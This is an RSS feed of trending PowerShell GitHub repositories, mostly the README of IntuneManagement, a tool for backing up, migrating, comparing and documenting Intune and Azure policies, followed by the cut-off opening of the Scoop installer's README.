<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>GitHub PowerShell Monthly Trending</title>
    <description>Monthly Trending of PowerShell in GitHub</description>
    <pubDate>Sun, 16 Mar 2025 02:07:20 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>Micke-K/IntuneManagement</title>
      <link>https://github.com/Micke-K/IntuneManagement</link>
      <description>&lt;p&gt;Copy, export, import, delete, document and compare policies and profiles in Intune and Azure with PowerShell script and WPF UI. Import ADMX files and registry settings with ADMX ingestion. View and edit PowerShell script.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;IntuneManagement with PowerShell and WPF UI&lt;/h1&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://twitter.com/Micke_K_72&quot;&gt; &lt;img src=&quot;https://img.shields.io/twitter/follow/Micke_K_72.svg?style=social&quot; target=&quot;_blank&quot;&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;These PowerShell scripts are using Microsoft Authentication Library (MSAL), Microsoft Graph APIs and Azure Management APIs to manage objects in Intune and Azure. The scripts have a simple WPF UI and it supports operations like Export, Import, Copy, Download, Compare etc.&lt;/p&gt; 
&lt;p&gt;This makes it easy to backup or clone a complete Intune environment. The scripts can export and import objects including assignments and support import/export between tenants. The scripts will create a migration table during export and use that for importing assignments in other environments. It will create missing groups in the target environment during import. Group information like name, description and type will be imported based on the exported group e.g. dynamic groups are supported. There will be one json file for each group in the export folder.&lt;/p&gt; 
&lt;p&gt;The script also support dependencies e.g. an App Protection is depending on an App, Policy Sets are depending on Compliance Policies, objects has Scope Tags etc. Dependency support requires exported json files and that the dependency objects are imported in the environment. The script uses the exported json files to get the Id and names of the exported object and uses that information and updates Id&#39;s before import an object from a json file. The Bulk Import form shows the import order of the objects. The objects with the lowest order number will be imported first.&lt;/p&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;img src=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/IntuneManagement.PNG&quot; height=&quot;80%&quot; width=&quot;80%&quot;&gt; &lt;/p&gt; 
&lt;p&gt;This PowerShell application is based on the foundation modules CloudAPIPowerShellManagement and Core. These modules manages UI, settings, logging etc. The functionality for the application is located in the extension modules. This makes it easy to add/remove features, views etc. Additional features will be added...&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Security note:&lt;/strong&gt; Since the scripts are not signed, a warning might be display when running it and files might be blocked. The script will unblock all files. This is to avoid issues that it fails to load the MSAL library etc. If there are any security concerns, the PowerShell code can be reviewed and the DLL files can be downloaded manually from Microsoft repositories, see links below. The DLL files &lt;em&gt;CAN&lt;/em&gt; be removed but MSAL is a pre-requisite for authentication. The script will try to find the DLL in the Az or MSAL.PS module if not found in the script root directory. DLL files are included to reduce dependencies.&lt;/p&gt; 
&lt;h2&gt;Starting the App&lt;/h2&gt; 
&lt;p&gt;Before starting the app:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The CMD files needs to be unblocked before the app can be started. The app can be started without it but Windows will prompt with a security warning.&lt;/li&gt; 
 &lt;li&gt;The script will unblock all other files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Before logging on:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The app will use the Intune PowerShell Azure Enterprise Application by default and only use the permissions granted to that appliction. Disable &lt;strong&gt;Use Default Permissions&lt;/strong&gt; in Settings to request additional permissions. This will cause a consent prompt if one or more permissions are missing for the app. &lt;strong&gt;Note:&lt;/strong&gt; If the app has not been approved for the organization, a consent prompt will be displayed.&lt;/li&gt; 
 &lt;li&gt;Enable &lt;strong&gt;Get Tenant List&lt;/strong&gt; in Settings if accessing multiple environments with the same account e.g. a guest account in other tenants. This might cause a Consent prompt&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Start the script by running &lt;strong&gt;Start.cmd&lt;/strong&gt;, &lt;strong&gt;Start-WithJson.cmd&lt;/strong&gt;, &lt;strong&gt;Start-WithConsole.cmd&lt;/strong&gt; or &lt;strong&gt;Start-IntuneManagement.ps1&lt;/strong&gt;. &lt;strong&gt;Start-WithConsole.cmd&lt;/strong&gt; will leave the command prompt window open so you can see the log while running the app.&lt;/p&gt; 
&lt;h2&gt;Silent Batch Job (Beta)&lt;/h2&gt; 
&lt;p&gt;The script can be executed without UI. This is to support DevOps environment.&lt;/p&gt; 
&lt;p&gt;Silent batch job is supported by the following features:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Export&lt;/li&gt; 
 &lt;li&gt;Import&lt;/li&gt; 
 &lt;li&gt;Documentation&lt;/li&gt; 
 &lt;li&gt;Compare&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The Silent Batch Job feature requires an Azure App to be configured with a secret or a certificate. The app must also be delegated with the required permissions to Graph objects used by the tool.&lt;/p&gt; 
&lt;p&gt;The silent feature uses an exported json file with settings for the specified operation. This file can be generated in the Bulk Export/Import forms. Required settings for the silent job is configured in the form and then exported to a file. The path to the file is then passed on the command line. The file can be used for multiple environments if the &lt;strong&gt;Add company name to the path&lt;/strong&gt; option is selected. Note that this requires that the app must have at least read permission on the Organizations API.&lt;/p&gt; 
&lt;p&gt;The following variables can be used in the path and filename:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;%Date% - This will be translated to yyyy-MM-dd format (eg 2020-02-27)&lt;/li&gt; 
 &lt;li&gt;%DateTime% - This will be translated to yyyyMMdd-HHmm format (eg 20200227-1750)&lt;/li&gt; 
 &lt;li&gt;%Organization% - Name of the tenant&lt;/li&gt; 
 &lt;li&gt;Any environment variable&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The tool will by default generate the files; &lt;code&gt;BulkExport.json&lt;/code&gt; and &lt;code&gt;BulkImport.json&lt;/code&gt;. These files can be merged into one file but that must be done manually. These files can also be edited manually. Each setting represents a control in the UI form. When the script is triggered silently, it will create the form in the background, populate it with the values from the file and then trigger the bulk function.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; The Silent Batch feature use settings configured in the UI. If this is triggered in a DevOps envionment, it is recommended to generate a settings JSON file with the desired settings and then use that in the DevOps environment&lt;/p&gt; 
&lt;p&gt;The app authentication can either be passed on the command line or stored in the settings. Tennant Settings is required for multiple environments.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Command line example:&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Start-IntuneManagement.ps1 -Silent -TenantId &quot;&amp;lt;&lt;em&gt;TenantID&lt;/em&gt;&amp;gt;&quot; -SilentBatchFile &amp;lt;&lt;em&gt;PathToFile&lt;/em&gt;&amp;gt; [-AppId &amp;lt;&lt;em&gt;AppId&lt;/em&gt;&amp;gt;] [-Secret &amp;lt;&lt;em&gt;Secret&lt;/em&gt;&amp;gt; | -Certificate &amp;lt;&lt;em&gt;CertThumb&lt;/em&gt;&amp;gt;]&lt;/p&gt; 
&lt;p&gt;Start-IntuneManagement.ps1 -Silent -SilentBatchFile &quot;C:\Temp\BatchImport.json&quot; -TenantId &quot;00000000-0000-0000-0000-000000000000&quot; -AppId &quot;00000000-0000-0000-0000-000000000001&quot; -Secret &quot;KJ76P~B9###9-.8I####-_MySecret&quot;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Setting example:&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Start-IntuneManagement.ps1 -Silent -SilentBatchFile &quot;C:\Temp\BatchImport.json&quot; -TenantId &quot;00000000-0000-0000-0000-000000000000&quot;&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;This script has an extension that can document profiles and policies in Intune. The output is using the same language strings as the Intune portal.&lt;/p&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/Documentation.md&quot;&gt;Documentation&lt;/a&gt; for more information&lt;/p&gt; 
&lt;h2&gt;Import&lt;/h2&gt; 
&lt;p&gt;The script can import the exported json files in multiple ways.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Always import:&lt;/strong&gt; The script will try to import the file. It will not check if it exists. This is the default behavior&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Skip if object exists:&lt;/strong&gt; The script will look if there is an existing object with the same name and type. It will not import the file if existing object is detected&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Replace (Preview):&lt;/strong&gt; If an existing object is detected, the script will&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Import the file without assignments&lt;/li&gt; 
   &lt;li&gt;Copy assignments from the existing object&lt;/li&gt; 
   &lt;li&gt;Run PostReplace commands - Priority will be set for Enrollment Restrictions etc.&lt;/li&gt; 
   &lt;li&gt;Update PolicySets object(s) to use the new imported object (detected by policySet assignments)&lt;/li&gt; 
   &lt;li&gt;Delete the original object&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Update (Preview):&lt;/strong&gt; This will update the existing object.&lt;/p&gt; &lt;p&gt;The update APIs do not support all the properties that the import APIs do and object types behaves differently during update e.g. Settings for &lt;strong&gt;Endpoint Security&lt;/strong&gt; objects will not be cleared. There is no API for removing settings, only adding. If a setting does not exist in the import file, the existing setting will be set to &lt;em&gt;Not Configured&lt;/em&gt;. &lt;strong&gt;Settings Catalog&lt;/strong&gt; replaces the whole settings property during update.&lt;/p&gt; &lt;p&gt;This has been tested with all supported object types &lt;em&gt;except&lt;/em&gt; Import Scripts (Shell), Android OEM Config and Apple Enrollment Types.&lt;/p&gt; &lt;p&gt;Each application type works differently. Update functionality has been tested on Win32, Windows MSI LoB, iOS Store, Microsoft Store and Microsoft 365 (Windows and MacOS).&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; Use Replace with caution! Replace will delete the existing object after a new object is imported and the assignments are copied, but it could cause issues in the environment if something in the process goes wrong. Replacing single objects can break references e.g. replacing an Application can break AutoPilot profiles, App Protection and App Configuration policies. Verify the process in a test environment before using this!&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Recommendation:&lt;/strong&gt; Backup all policies before running Replace/Update.&lt;/p&gt; 
&lt;p&gt;The Replace/Update feature can be used in a scenario where all profiles/policies are managed in a separate reference (Dev/Test) and then implemented in one or more destination environments. The existing objects will then be reset to have the same settings as the reference environment&lt;/p&gt; 
&lt;h2&gt;Comparison&lt;/h2&gt; 
&lt;p&gt;This script has an extension that can compare objects in Intune with exported json files. It will display a data grid with the values and highlight updated values with red.&lt;/p&gt; 
&lt;p&gt;Objects can be compared based on property values or documented values.&lt;/p&gt; 
&lt;p&gt;The property value method is a quick way to compare objects but it will only show the names and values of the native Intune object. This is not a good comparison method for Settings objects since they have all the settings in one property.&lt;/p&gt; 
&lt;p&gt;The documentation method is a bit slower but will show the values as they are stated in the Intune portal. This is the recommended way to compare objects but note that this is only supported on object types that supports documentation.&lt;/p&gt; 
&lt;p&gt;Bulk compare is supported. This can be performed in two ways:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Intune Objects with Exported Files&lt;/strong&gt; - This will read each exported file and compare it with the existing object&lt;/p&gt; &lt;p&gt;The result file will be stored in the exported folder structure. Either in the Object Type folder or the parent folder depending on the Save as setting.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This cannot be used with files exported from a different environment since it used the Id as identifier&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Named Objects in Intune&lt;/strong&gt; - Compare Intune objects based on patterns&lt;/p&gt; &lt;p&gt;This can be used in where a pattern is used separate objects between different environments e.g. [Test] Policy 1 vs [Prod] Policy 1.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Files in Exported Folders&lt;/strong&gt; - Compare two exported folders&lt;/p&gt; &lt;p&gt;This can be used in where a pattern is used separate objects between different environments e.g. [Test] Policy 1 vs [Prod] Policy 1.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Output files are by default stored in the My Documents folder.&lt;/p&gt; 
&lt;p&gt;The output CSV can either be one file for ALL objects or one file for each Object Type.&lt;/p&gt; 
&lt;h2&gt;Bulk Copy&lt;/h2&gt; 
&lt;p&gt;Bulk copy can be used to clone objects based on a name pattern. This can be used in the same scenario as Bulk Compare where the object names includes an environment identifier. The application will identify all objects matching the source pattern and copy each object with a new name matching the &#39;Copy object name pattern&#39;. The object will not be copied if it detects that an object already exists with the new name.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Assignments will NOT be copied.&lt;/p&gt; 
&lt;h2&gt;Intune Tools&lt;/h2&gt; 
&lt;p&gt;Additional Intune Tools is included in the script.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;ADMX Import&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Import 3rd part ADMX settings like Chrome etc. by using a UI similar to GPMC&lt;/li&gt; 
   &lt;li&gt;Support for any language if there is an ADML file for it&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Reg Values&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Create registry settings in HKLM or HKCU. Supported value types: 
    &lt;ul&gt; 
     &lt;li&gt;String&lt;/li&gt; 
     &lt;li&gt;Multi-String&lt;/li&gt; 
     &lt;li&gt;Expandable String&lt;/li&gt; 
     &lt;li&gt;DWORD&lt;/li&gt; 
     &lt;li&gt;List (Key/Value pair)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;This tool creates a custom ADMX file based on the specified registry keys.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Intune Assignments&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Quickly gather all assignments from an export&lt;/li&gt; 
   &lt;li&gt;Easily identify all profiles/policies a group is assigned to&lt;/li&gt; 
   &lt;li&gt;Export as CSV to analyse in Excel&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/ADMXImport.md&quot;&gt;ADMX Import&lt;/a&gt; for more information about the ADMX tools&lt;/p&gt; 
&lt;h2&gt;Columns&lt;/h2&gt; 
&lt;p&gt;Custom columns is supported. The script will by default add id, displayName and description with exception for some object types. These are configured in the EndpointManager.ps1 and EndpointManagerInfo.psm1 files.&lt;/p&gt; 
&lt;p&gt;Custom columns can be added for each Object Type in the detailed view of an Object.&lt;/p&gt; 
&lt;p&gt;Custom Columns settings are stored in the regitry, in HKCU\SOFTWARE\CloudAPIPowerShellManagement\EndpointManager\ObjectColumns\&lt;em&gt;ObjectType&lt;/em&gt;.&lt;/p&gt; 
&lt;p&gt;The &lt;em&gt;ObjectType&lt;/em&gt; value represents the ViewItem ID specified in the EndpointManager.ps1 and EndpointManagerInfo.psm1 files. This is also the same as the parent folder when items are exported.&lt;/p&gt; 
&lt;p&gt;The REG_SZ value has the following syntax:&lt;/p&gt; 
&lt;p&gt;[0|1],Property1[=Header1],Property2[=Header2],...&lt;/p&gt; 
&lt;p&gt;0|1 - Optional value specifying if columns are added or replacing default columns&lt;/p&gt; 
&lt;p&gt;0 = Replace default columns with columns specified in the registry value 1 = Add columns specified in the registry to the default columns. This is default setting.&lt;/p&gt; 
&lt;p&gt;PropertyX - Property to display. View an object to see available properties&lt;/p&gt; 
&lt;p&gt;HeaderX - Optional value for the column header. Property name will be used if this is not specified.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Some object types returns multiple object types, @OData.Type. If a custom column is added but the property does not exist on all the object types that were returned, the column value will be empty. The code will &lt;strong&gt;not&lt;/strong&gt; break if the property is missing on one or more returned objects.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Example 1:&lt;/strong&gt; Reg key: HKCU\SOFTWARE\CloudAPIPowerShellManagement\EndpointManager\ObjectColumns\DeviceConfiguration&lt;/p&gt; 
&lt;p&gt;REG_SZ value: &lt;strong&gt;lastModifiedDateTime&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;This will add the &lt;strong&gt;lastModifiedDateTime&lt;/strong&gt; to the existing columns.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Example 2:&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Reg key: HKCU\SOFTWARE\CloudAPIPowerShellManagement\EndpointManager\ObjectColumns\TermsOfUse&lt;/p&gt; 
&lt;p&gt;REG_SZ value: 0,id=Id,displayName=Name,files[0].displayName=Display Name&lt;/p&gt; 
&lt;p&gt;This will replace the default columns and add new columns with specific header.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Sub-properties are supported e.g. &lt;strong&gt;files[0].displayName&lt;/strong&gt;. This will add a column based on the first object in the files property.&lt;/p&gt; 
&lt;h2&gt;Change log&lt;/h2&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/ReleaseNotes.md&quot;&gt;Change Log&lt;/a&gt; for more information&lt;/p&gt; 
&lt;h2&gt;Authentication&lt;/h2&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/MSALInfo.md&quot;&gt;MSAL Info&lt;/a&gt; for more information about authentication&lt;/p&gt; 
&lt;h2&gt;Settings&lt;/h2&gt; 
&lt;p&gt;Settings for the script is default stored in the registry. However, the script supports settings to be stored in a json file so it can be copied between computers. Registry settings can be exported in the Settings dialog.&lt;/p&gt; 
&lt;p&gt;To use settings based on a json file:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Start-IntuneManagement.ps1 -JSonSettings [-JSonFile &amp;lt;PathToFile&amp;gt;]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If only -JSonSettings is used the script will use the default json setting file:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;%LOCALAPPDATA%\CloudAPIPowerShellManagement\Settings.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Use -JSonFile for custom location of the file&lt;/p&gt; 
&lt;p&gt;Start-WithJson.cmd is included as an example on how to start the script with json settings.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If the file can&#39;t be created, the script will revert back registry. Make sure that the script can write to the file. It is not recommended to store the file in a folder that requires UAC to get write permissions.&lt;/p&gt; 
&lt;h2&gt;Supported Intune objects&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;ADMX Files [^1]&lt;/li&gt; 
 &lt;li&gt;App Configurations (App and Device)&lt;/li&gt; 
 &lt;li&gt;App Protection&lt;/li&gt; 
 &lt;li&gt;Applications [^2]&lt;/li&gt; 
 &lt;li&gt;Apple Enrolment Types - NOT fully tested&lt;/li&gt; 
 &lt;li&gt;Autopilot profiles&lt;/li&gt; 
 &lt;li&gt;Baseline Security profiles&lt;/li&gt; 
 &lt;li&gt;Compliance policies&lt;/li&gt; 
 &lt;li&gt;Compliance policies v2&lt;/li&gt; 
 &lt;li&gt;Compliance scripts&lt;/li&gt; 
 &lt;li&gt;Conditional Access&lt;/li&gt; 
 &lt;li&gt;Custom Attributes&lt;/li&gt; 
 &lt;li&gt;Device Configuration (Administrative Templates, Configuration Policies, Android OEM Config, Settings Catalog)&lt;/li&gt; 
 &lt;li&gt;Endpoint Security (Account Protection, Disk Encryption, Firewall, Security Baselines etc.) [^3]&lt;/li&gt; 
 &lt;li&gt;Enrollment Restrictions&lt;/li&gt; 
 &lt;li&gt;Enrollment Status Page profiles&lt;/li&gt; 
 &lt;li&gt;Feature Updates&lt;/li&gt; 
 &lt;li&gt;Filters&lt;/li&gt; 
 &lt;li&gt;Intune Branding (Company Portal)&lt;/li&gt; 
 &lt;li&gt;Locations&lt;/li&gt; 
 &lt;li&gt;Named Locations&lt;/li&gt; 
 &lt;li&gt;Notifications&lt;/li&gt; 
 &lt;li&gt;Policy Sets&lt;/li&gt; 
 &lt;li&gt;Quality Updates&lt;/li&gt; 
 &lt;li&gt;Reusable Settings&lt;/li&gt; 
 &lt;li&gt;Role Definitions&lt;/li&gt; 
 &lt;li&gt;Scope Tags&lt;/li&gt; 
 &lt;li&gt;Scripts (PowerShell and Shell scripts, supports download of script)&lt;/li&gt; 
 &lt;li&gt;Terms and Conditions&lt;/li&gt; 
 &lt;li&gt;Terms of Use&lt;/li&gt; 
 &lt;li&gt;Update Policies&lt;/li&gt; 
 &lt;li&gt;Co-management Settings&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;[^1]: ADMX file must be located in the export folder or in the folder defined in Settings. Administrative Template policies based on ADMX files must be imported after the ADMX file is imported. [^2]: Export is support but .intunewin files will not be exported. The .intunewin file must exist in the exported folder or in the folder defined in Settings -&amp;gt; App packages folder. [^3]: Some Endpoint Security policies will be exported to the SettingsCatalg since they are based the Settings Catalog API.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The scripts are using the BETA version of the Graph API which might change at any time.&lt;/p&gt; 
&lt;h2&gt;Azure Management APIs&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Tenants for the current user&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Azure Management APIs are undocumented APIs which might not be supported and they might change at any time.&lt;/p&gt; 
&lt;h2&gt;Pre-requisites&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;.Net 4.7&lt;/li&gt; 
 &lt;li&gt;PowerShell 5.1&lt;/li&gt; 
 &lt;li&gt;MSAL 
  &lt;ul&gt; 
   &lt;li&gt;Microsoft.Identity.Client.dll version 4.42.1.0 is included in this version&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;License and permissions in Azure to manage objects in Intune and Azure&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;References&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/graph/api/overview?toc=./ref/toc.json&amp;amp;view=graph-rest-beta&quot;&gt;Microsoft Graph API&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.nuget.org/packages/Microsoft.Identity.Client/&quot;&gt;Microsoft.Identity.Client&lt;/a&gt; (MSAL download)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/AzureAD/MSAL.PS&quot;&gt;MSAL.PS Module&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az&quot;&gt;Az PowerShellModule&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/microsoft/Intune-PowerShell-SDK&quot;&gt;Microsoft Intune PowerShell Module&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.nuget.org/packages/Microsoft-WindowsAPICodePack-Core&quot;&gt;Microsoft.WindowsAPICodePack&lt;/a&gt; and &lt;a href=&quot;https://www.nuget.org/packages/Microsoft-WindowsAPICodePack-Shell&quot;&gt;Microsoft.WindowsAPICodePack.Shell&lt;/a&gt; for Browse Folder dialogs&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Acknowledgments&lt;/h2&gt; 
&lt;p&gt;The app encryption and upload is based on &lt;a href=&quot;https://github.com/microsoftgraph/powershell-intune-samples&quot;&gt;Graph PowerShell Intune Examples&lt;/a&gt;&lt;br&gt; Some MSAL functionalities are based on &lt;a href=&quot;https://github.com/AzureAD/MSAL.PS&quot;&gt;MSAL.PS Module&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Known Issues&lt;/h2&gt; 
&lt;p&gt;Device Configuration and App Configuration objects are split up in different object types. They are using different Graph APIs and each object type in the menu uses one API. This is also why all Endpoint Security objects are of the same object type. They use the same API but are separated based on the Baseline Template Id they use.&lt;/p&gt; 
&lt;p&gt;Android Store Apps are &lt;strong&gt;not&lt;/strong&gt; imported. The Create API is documented in Microsoft Graph but it&#39;s not working. Looks like these apps must be synched from Google Play.&lt;/p&gt; 
&lt;p&gt;Using multiple tenants support causes multiple logins/consent prompts the first time if &#39;Microsoft Graph PowerShell&#39; is used. Querying the API for tenant list uses a different scope that is not included by default in the &#39;Microsoft Graph PowerShell&#39; app.&lt;/p&gt; 
&lt;p&gt;&lt;del&gt;Using multiple tenants support &lt;em&gt;might&lt;/em&gt; cause and endless loop in the login screen and cause duplicate accounts in token cache. Actual cause is not found yet but it happens on rare occasions and it looks like it happens when a guest account is used. Workaround: Cancel the login, restart the script, logout and restart the script again.&lt;/del&gt; - Not seen this in a long time. Please create an issue if this happens&lt;/p&gt; 
&lt;p&gt;When multi tenant settings is Enabled/Disabled, the Profile Info is not updated until the account is changed or app is restarted. Profile Info popup is built after logon.&lt;/p&gt; 
&lt;p&gt;The &lt;em&gt;List Applications&lt;/em&gt; API might not list an imported app immediately after the import. Click &lt;em&gt;Refresh&lt;/em&gt; to reload the application objects.&lt;/p&gt; 
&lt;p&gt;&lt;del&gt;When using the filter box to search for items, the checkbox must be clicked twice to select an item.&lt;/del&gt;&lt;br&gt; Issue fixed in 3.3.2&lt;/p&gt; 
&lt;p&gt;Logout will only clear the token from cache and not from the browser e.g. if login is triggered after a logout, the user will still be listed in the &#39;Select user&#39; dialog.&lt;/p&gt; 
&lt;p&gt;&lt;del&gt;Referenced settings will NOT be imported/copied. There is no value stored in a property on the object for these settings. Example: A VPN profile has certificates as referenced properties. The certificates must be added manually after import/copy.&lt;/del&gt; Issue fixed in 3.5.0&lt;/p&gt; 
&lt;p&gt;Terms of Use requires that the pdf file is available. This must be manually copied to either the Export folder for Terms of Use or to the Intune Application folder specified in Settings. It is currently not possible to export the pdf file with Graph API.&lt;/p&gt; 
&lt;p&gt;The ADMX/ADML files must be manually copied to either the Export folder for Administrative Templates or to the Intune Application folder specified in Settings. It is currently not possible to export the pdf file with Graph API.&lt;/p&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/Documentation.md&quot;&gt;Documentation&lt;/a&gt; for issues regarding the documentation process.&lt;/p&gt; 
&lt;h2&gt;TIP&lt;/h2&gt; 
&lt;p&gt;Check the log file for errors. The UI might not show errors why login failed etc. The log uses the Endpoint Configuration Manager (SCCM) format and it is best viewed with CMTrace or OneTrace. An old version of CMTrace can be downloaded &lt;a href=&quot;https://www.microsoft.com/en-us/download/confirmation.aspx?id=50012&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;This project is licensed under the MIT License - see the &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/LICENSE&quot;&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ScoopInstaller/Scoop</title>
      <link>https://github.com/ScoopInstaller/Scoop</link>
      <description>&lt;p&gt;A command-line installer for Windows.&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&quot;center&quot;&gt;Scoop&lt;/h1&gt; 
&lt;!--&lt;img src=&quot;scoop.png&quot; alt=&quot;Long live Scoop!&quot;/&gt;--&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop#what-does-scoop-do&quot;&gt;Features&lt;/a&gt; | &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop#installation&quot;&gt;Installation&lt;/a&gt; | &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop/wiki&quot;&gt;Documentation&lt;/a&gt; &lt;/p&gt; 
&lt;hr&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop&quot;&gt; &lt;img src=&quot;https://img.shields.io/github/languages/code-size/ScoopInstaller/Scoop.svg?sanitize=true&quot; alt=&quot;Code Size&quot;&gt; &lt;/a&gt; &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop&quot;&gt; &lt;img src=&quot;https://img.shields.io/github/repo-size/ScoopInstaller/Scoop.svg?sanitize=true&quot; alt=&quot;Repository size&quot;&gt; &lt;/a&gt; &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop/actions/workflows/ci.yml&quot;&gt; &lt;img src=&quot;https://github.com/ScoopInstaller/Scoop/actions/workflows/ci.yml/badge.svg?sanitize=true&quot; alt=&quot;Scoop Core CI Tests&quot;&gt; &lt;/a&gt; &lt;a href=&quot;https://discord.gg/s9yRQHt&quot;&gt; &lt;img src=&quot;https://img.shields.io/badge/chat-on%20discord-7289DA.svg?sanitize=true&quot; alt=&quot;Discord Chat&quot;&gt; &lt;/a&gt; &lt;a href=&quot;https://gitter.im/lukesampson/scoop&quot;&gt; &lt;img src=&quot;https://badges.gitter.im/lukesampson/scoop.png&quot; alt=&quot;Gitter Chat&quot;&gt; &lt;/a&gt; &lt;a href=&quot;https://raw.githubusercontent.com/ScoopInstaller/Scoop/master/LICENSE&quot;&gt; &lt;img src=&quot;https://img.shields.io/badge/license-UNLICENSE%20or%20MIT-blue&quot; alt=&quot;License&quot;&gt; &lt;/a&gt; 